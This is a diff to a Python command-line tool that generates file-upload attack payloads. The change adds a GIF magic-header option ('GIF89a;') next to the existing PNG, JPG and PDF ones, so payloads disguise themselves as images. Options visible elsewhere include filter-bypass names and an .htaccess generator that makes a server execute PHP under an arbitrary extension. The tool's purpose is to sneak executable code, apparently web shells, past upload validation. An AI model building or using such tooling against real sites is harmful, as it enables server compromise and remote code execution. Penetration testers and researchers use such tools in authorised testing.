@@ -43,12 +43,15 @@ def main(name, payload, file, extension, bypass, magic, htaccess, debug):
     if magic == "png": # If the user want to use the magic header
         name = f"magic_png_{name}"
         payload = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0" + payload.encode('utf-8')
-    elif magic == "jpg": # If the user want to use the magic header
+    elif magic == "jpg": 
         name = f"magic_jpg_{name}"
         payload = b"\xff\xd8\xff\xe0" + payload.encode('utf-8')
-    elif magic == "pdf": # If the user want to use the magic header
+    elif magic == "pdf": 
         name = f"magic_pdf_{name}"
         payload = b"\x25\x50\x44\x46\x2d" + payload.encode('utf-8')
+    elif magic == "gif":
+        name = f"magic_gif_{name}"
+        payload = b"GIF89a;" + payload.encode('utf-8')    
     else:
         payload = payload.encode('utf-8')
 
@@ -75,7 +78,7 @@ if __name__ == '__main__':
     parser.add_argument('-ext', '--extension', help='Generate the payload with specific extension',metavar='<ext>')
     parser.add_argument('-b', '--bypass', action='store_true', help='Generate some payload to bypass the restriction')
     parser.add_argument('-n', '--name', help='Name of the file', default='payload',metavar='<name>')
-    parser.add_argument('-m', '--magic', help='Magic Header, add the magics numbers before the payload', choices=['png', 'jpg', 'pdf'])
+    parser.add_argument('-m', '--magic', help='Magic Header, add the magics numbers before the payload', choices=['png', 'jpg', 'pdf', 'gif'])
     parser.add_argument('-ht', '--htaccess', help='Creates in addition a .htaccess file, which allow execution of php whith extension that you have chosen',metavar='<ext>')
     args = parser.parse_args()
     print(args)
